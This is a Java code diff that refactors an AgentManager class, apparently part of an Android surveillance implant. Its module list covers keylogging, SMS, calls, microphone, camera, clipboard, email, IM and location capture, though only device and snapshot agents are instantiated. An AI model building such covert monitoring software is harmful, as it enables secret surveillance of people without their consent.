@@ -10,7 +10,6 @@ public class AgentManager {
 	private volatile static AgentManager singleton;
 	private Status statusObj;
 	
-	private DeviceAgent deviceAgent;
 	private HashMap<Integer, AgentBase> running;
 	
 	public static AgentManager self() {
@@ -29,6 +28,86 @@ public class AgentManager {
 		statusObj = Status.self();
 		
 		running = new HashMap<Integer, AgentBase>();
+	}
+	
+	/**
+	 * mapAgent()
+	 * Add agent id defined by "key" into the running map. If the agent
+	 * is already present, the old object is returned.
+	 * 
+	 * @param key: Agent ID
+	 * @return the requested agent or null in case of error
+	 */
+	private AgentBase mapAgent(int key) {
+		AgentBase a = null;
+		
+		if (running.containsKey(key) == true) {
+			return running.get(key);			
+		}
+		
+		switch (key) {
+			case Agent.AGENT_SMS:
+				break;
+				
+			case Agent.AGENT_TASK:
+				break;
+				
+			case Agent.AGENT_CALLLIST:
+				break;
+				
+			case Agent.AGENT_DEVICE:
+				a = new DeviceAgent();
+				break;
+				
+			case Agent.AGENT_POSITION:
+				break;
+				
+			case Agent.AGENT_CALL:
+				break;
+				
+			case Agent.AGENT_CALL_LOCAL:
+				break;
+				
+			case Agent.AGENT_KEYLOG:
+				break;
+				
+			case Agent.AGENT_SNAPSHOT:
+				a = new SnapshotAgent();
+				break;
+				
+			case Agent.AGENT_URL:
+				break;
+				
+			case Agent.AGENT_IM:
+				break;
+				
+			case Agent.AGENT_EMAIL:
+				break;
+				
+			case Agent.AGENT_MIC:
+				break;
+				
+			case Agent.AGENT_CAM:
+				break;
+				
+			case Agent.AGENT_CLIPBOARD:
+				break;
+				
+			case Agent.AGENT_CRISIS:
+				break;
+				
+			case Agent.AGENT_APPLICATION:
+				break;
+				
+			default:
+				break;
+		}
+		
+		if (a != null) {
+			running.put(key, a);
+		}
+		
+		return a;
 	}
 	
 	public void startAgents() {
@@ -54,76 +133,16 @@ public class AgentManager {
 			if (pairs.getValue().getStatus() != Agent.AGENT_ENABLED)
 				continue;
 			
-			switch (pairs.getKey()) {
-				case Agent.AGENT_SMS:
-					break;
-					
-				case Agent.AGENT_TASK:
-					break;
-					
-				case Agent.AGENT_CALLLIST:
-					break;
-					
-				case Agent.AGENT_DEVICE:
-					deviceAgent = new DeviceAgent();
-					
-					if (running.containsKey(Agent.AGENT_DEVICE) == true) {
-						//throw new RCSException("Agent Device" already loaded");			
-					}
-					
-					running.put(Agent.AGENT_DEVICE, deviceAgent);
-
-					deviceAgent.parse(pairs.getValue().getParams());
-					deviceAgent.start();
-					break;
-					
-				case Agent.AGENT_POSITION:
-					break;
-					
-				case Agent.AGENT_CALL:
-					break;
-					
-				case Agent.AGENT_CALL_LOCAL:
-					break;
-					
-				case Agent.AGENT_KEYLOG:
-					break;
-					
-				case Agent.AGENT_SNAPSHOT:
-					//SnapshotAgent snapshotAgent = new SnapshotAgent();
-					//snapshotAgent.start();
-					break;
-					
-				case Agent.AGENT_URL:
-					break;
-					
-				case Agent.AGENT_IM:
-					break;
-					
-				case Agent.AGENT_EMAIL:
-					break;
-					
-				case Agent.AGENT_MIC:
-					break;
-					
-				case Agent.AGENT_CAM:
-					break;
-					
-				case Agent.AGENT_CLIPBOARD:
-					break;
-					
-				case Agent.AGENT_CRISIS:
-					break;
-					
-				case Agent.AGENT_APPLICATION:
-					break;
-					
-				default:
-					break;
+			AgentBase a = mapAgent(pairs.getKey());
+			
+			if (a != null) {
+				a.parse(pairs.getValue().getParams());
+				a.start();
 			}
 		}
 	}
 	
+	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
 	public void stopAgents() {
 		Iterator<Map.Entry<Integer, AgentBase>> it = running.entrySet().iterator();
 		
@@ -134,7 +153,46 @@ public class AgentManager {
 				continue;
 			
 			pairs.getValue().stopAgent();
-		}		
+		}	
+	}
+	
+	public void startAgent(int key) {
+		HashMap<Integer, Agent> agents;
+		
+		agents = statusObj.getAgentsMap();
+		
+		if (agents == null) {
+			Log.d("Que", "Agents map null");
+			return;
+		}
+		
+		if (running == null) {
+			Log.d("Que", "Running Agents map null");
+			return;
+		}
+		
+		AgentBase a = mapAgent(key);
+		
+		if (a == null)
+			return;
+		
+		// Agent mapped and running
+		if (a.getStatus() == Agent.AGENT_RUNNING) {
+			Log.d("Que", "Agent " + key + " is already running");
+			return;
+		}
+		
+		// start() will NEVER be valid again on a stopped thread
+		// so unmap and restart the thread
+		if (a.getStatus() == Agent.AGENT_STOPPED) {
+			running.remove(key);
+			a = mapAgent(key);
+		}
+		
+		if (a != null) {
+			a.parse(agents.get(key).getParams());
+			a.start();
+		}
 	}
 	
 	public void stopAgent(int key) {
